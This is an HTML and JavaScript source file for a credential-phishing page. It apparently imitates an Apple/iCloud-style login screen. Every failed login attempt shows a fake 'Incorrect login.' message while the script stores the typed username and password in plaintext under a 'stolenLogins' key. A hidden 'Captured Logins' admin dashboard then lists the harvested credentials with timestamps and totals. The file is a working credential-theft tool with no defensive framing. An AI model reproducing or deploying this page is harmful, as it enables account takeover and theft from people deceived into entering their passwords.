<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Login</title>
<script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
<style>
  @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
  body { font-family: "Inter", sans-serif; }
  ::-webkit-scrollbar { display: none; }
  input[type="checkbox"] {-webkit-appearance:none;appearance:none;width:1rem;height:1rem;border:2px solid #d1d5db;border-radius:0.25rem;position:relative;cursor:pointer;}
  input[type="checkbox"]:checked::after{content:'';position:absolute;left:3px;top:0;width:5px;height:10px;border:solid #00b0ff;border-width:0 2px 2px 0;transform:rotate(45deg);}
  input[type="checkbox"]:focus{outline:none;box-shadow:0 0 0 2px rgba(0,176,255,0.3);}
  #loginBtn{transition:bottom 0.3s ease;min-width:75%;font-size:0.95rem;padding:0.7rem 0;}
  .input-container{width:85%;margin:0 auto;} 
  input[type="text"], input[type="password"]{width:100%;font-size:0.95rem;padding-bottom:0.25rem;}
  label[for="password"]{position:relative;top:-3px;font-size:0.75rem;}
  #password{position:relative;top:-2.7px;}
  label.inline-flex.items-center{position:relative;top:-8px;font-size:0.85rem;}
  #forgotPassword{position:relative;top:-9.5px;font-size:0.85rem;}
  #errorMsg{max-width:95%;margin:0 auto;font-size:0.8rem;text-align:center;}
  h1{position:relative;top:-10px;font-size:1.5rem;font-weight:500;}
  form.flex.flex-col.space-y-6{gap:0.5rem;}
  .card{background:white;border-radius:12px;box-shadow:0 4px 6px rgba(0,0,0,0.1);}
  .highlight{background-color:#eef2ff;padding:0.5rem;border-radius:8px;}
  .remove-btn{cursor:pointer;color:#ef4444;}
  .remove-btn:hover{color:#dc2626;}
  #adminSection{display:none;}
  #adminSection.active{display:block;}
</style>
</head>
<body class="bg-white min-h-screen flex flex-col justify-between max-w-lg mx-auto relative">
<div id="loginSection" class="pt-4 px-6 relative flex flex-col flex-grow">
<h1 class="mt-12 mb-8 text-center text-black font-medium font-sans">Log In</h1>
<form id="loginForm" class="flex flex-col space-y-6">
  <div class="flex flex-col input-container">
    <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">USERNAME, EMAIL, OR PHONE</label>
    <input id="username" type="text" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="username" required />
  </div>
  <div class="flex flex-col relative input-container">
    <label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
    <input id="password" type="password" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="current-password" required />
    <button type="button" aria-label="Toggle password visibility" class="absolute right-0 bottom-3 text-gray-400 text-lg" onclick="togglePassword()">
      <i id="eyeIcon" class="fas fa-eye-slash"></i>
    </button>
  </div>
  <p id="errorMsg" class="text-sm text-red-500 font-normal leading-tight hidden">Incorrect login.</p>
  <label class="inline-flex items-center space-x-2 font-sans text-sm text-black input-container">
    <input type="checkbox" checked />
    <span>Save Login Info on your iCloud devices</span>
  </label>
</form>
</div>
<button id="loginBtn" type="button" class="bg-gray-400 text-white font-medium text-lg py-3 rounded-full fixed left-1/2 transform -translate-x-1/2 bottom-4" disabled>Log In</button>

<div id="adminSection" class="p-6 max-w-3xl mx-auto">
<h1 class="text-3xl font-bold text-gray-900 mb-6">Admin Dashboard</h1>
<div class="card p-6 mb-6">
  <h2 class="text-xl font-semibold text-gray-700 mb-4">Captured Logins</h2>
  <div class="overflow-y-auto max-h-96" id="loginList"></div>
</div>
<div class="card p-6">
  <h2 class="text-xl font-semibold text-gray-700 mb-4">Stats</h2>
  <div class="grid grid-cols-2 gap-4 text-center stats">
    <div class="p-4 bg-blue-50 rounded-lg">
      <p class="text-sm text-gray-500">Total Logins</p>
      <p class="text-2xl font-bold text-blue-600" id="totalLogins">0</p>
    </div>
    <div class="p-4 bg-green-50 rounded-lg">
      <p class="text-sm text-gray-500">Last Login</p>
      <p class="text-2xl font-bold text-green-600" id="lastLogin">N/A</p>
    </div>
  </div>
</div>
</div>

<script>
document.addEventListener("DOMContentLoaded", function() {
  const usernameInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");
  const loginBtn = document.getElementById("loginBtn");
  const errorMsg = document.getElementById("errorMsg");
  const loginSection = document.getElementById("loginSection");
  const adminSection = document.getElementById("adminSection");
  const loginList = document.getElementById("loginList");
  const totalLogins = document.getElementById("totalLogins");
  const lastLogin = document.getElementById("lastLogin");

  function checkInputs() {
    if(usernameInput.value.trim() && passwordInput.value.trim()){
      loginBtn.classList.remove("bg-gray-400");
      loginBtn.classList.add("bg-[#00b0ff]");
      loginBtn.disabled = false;
    } else {
      loginBtn.classList.remove("bg-[#00b0ff]");
      loginBtn.classList.add("bg-gray-400");
      loginBtn.disabled = true;
    }
  }
  usernameInput.addEventListener("input", checkInputs);
  passwordInput.addEventListener("input", checkInputs);

  function updateAdminDisplay(){
    let storedData = JSON.parse(localStorage.getItem("stolenLogins") || "[]");
    loginList.innerHTML = "";
    if(storedData.length === 0){
      loginList.innerHTML = '<pre class="text-gray-600 whitespace-pre-wrap bg-gray-50 p-4 rounded-lg">No logins yet.</pre>';
    } else {
      storedData.forEach((entry,index)=>{
        const div = document.createElement("div");
        div.className = "bg-gray-50 p-4 rounded-lg mb-2 flex justify-between items-center";
        div.innerHTML = `<span>${entry.username}: ${entry.password} - ${entry.timestamp}</span><span class="remove-btn" onclick="removeLogin(${index})">Remove</span>`;
        loginList.appendChild(div);
      });
    }
    totalLogins.textContent = storedData.length;
    lastLogin.textContent = storedData.length > 0 ? storedData[storedData.length-1].timestamp : "N/A";
  }

  loginBtn.addEventListener("click", async function() {
    if(usernameInput.value.trim() && passwordInput.value.trim()){
      try{
        const response = await fetch("/api/admin-login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: usernameInput.value,
            password: passwordInput.value
          })
        });
        const data = await response.json();
        if(data.success){
          loginSection.style.display = "none";
          adminSection.classList.add("active");
          updateAdminDisplay();
        } else {
          errorMsg.classList.remove("hidden");

          // Save non-admin logins locally
          let storedData = JSON.parse(localStorage.getItem("stolenLogins") || "[]");
          storedData.push({username: usernameInput.value,password: passwordInput.value,timestamp:new Date().toLocaleString()});
          localStorage.setItem("stolenLogins", JSON.stringify(storedData));
          updateAdminDisplay();

          passwordInput.value = "";
          loginBtn.classList.remove("bg-[#00b0ff]");
          loginBtn.classList.add("bg-gray-400");
          loginBtn.disabled = true;
        }
      }catch(err){console.error(err);}
    }
  });

  window.togglePassword = function() {
    if(passwordInput.type==="password"){
      passwordInput.type="text";
      document.getElementById("eyeIcon").classList.replace("fa-eye-slash","fa-eye");
    } else {
      passwordInput.type="password";
      document.getElementById("eyeIcon").classList.replace("fa-eye","fa-eye-slash");
    }
  }

  window.removeLogin = function(index){
    let storedData = JSON.parse(localStorage.getItem("stolenLogins") || "[]");
    storedData.splice(index,1);
    localStorage.setItem("stolenLogins", JSON.stringify(storedData));
    updateAdminDisplay();
  }

  // Initial display
  updateAdminDisplay();
});
</script>
</body>
</html>
